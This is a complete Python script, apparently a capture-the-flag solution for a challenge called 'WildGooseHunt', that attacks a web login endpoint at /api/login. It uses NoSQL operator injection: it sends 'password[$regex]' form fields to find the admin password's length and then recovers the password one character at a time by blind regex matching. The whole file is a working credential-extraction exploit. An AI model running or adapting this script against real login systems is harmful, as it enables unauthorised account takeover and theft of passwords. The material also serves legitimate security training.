import requests
import re
import sys
from string import printable

if len(sys.argv) != 2:
    print("Usage: python3 WildGooseHunt.py <ip:port>")
    sys.exit(1)

target = sys.argv[1]
url = f"http://{target}/api/login"
headers = { "Content-Type": "application/x-www-form-urlencoded" }

def send(payload):
    data = {
        "username": "admin"
    }
    data.update(payload)
    r = requests.post(url, data=data, headers=headers)
    return "Login Successful, welcome back admin." in r.text

print("Finding password length...")

length = 0
for i in range(1, 100):
    if send({ "password[$regex]": f"^.{{{i}}}$" }):
        length = i
        print("Password length is", length)
        break

print("Starting brute-force...")

password = ""

for i in range(length):
    for c in printable:
        attempt = password + c
        if send({ "password[$regex]": f"^{re.escape(attempt)}" }):
            password += c
            print("Current password:", password)
            break

print("Final password:", password)
